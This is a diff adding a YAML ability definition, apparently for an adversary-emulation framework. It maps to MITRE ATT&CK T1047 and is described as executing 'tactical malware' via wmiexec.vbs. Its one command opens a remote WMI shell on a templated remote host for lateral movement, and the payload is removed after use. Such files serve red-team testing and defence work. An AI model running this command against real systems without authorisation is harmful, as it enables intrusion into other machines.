@@ -1,0 +1,31 @@
+ability_id: 8911d502-747a-4155-adcd-b03a1f284ee7
+access: {}
+additional_info: {}
+buckets:
+- execution
+delete_payload: true
+description: Using wmiexec.vbs to execute tactical malware
+executors:
+- additional_info: {}
+  build_target: null
+  cleanup: []
+  code: null
+  command: cscript.exe "#{wmiexec_local_path}\wmiexec.vbs" /shell "#{wmiexec_remote_host}"
+  language: null
+  name: cmd
+  parsers: []
+  payloads:
+  - wmiexec.vbs
+  platform: windows
+  timeout: 60
+  uploads: []
+  variations: []
+name: Windows Management Instrumentation
+plugin: emu
+privilege: ''
+repeatable: false
+requirements: []
+singleton: false
+tactic: execution
+technique_id: T1047
+technique_name: Windows Management Instrumentation
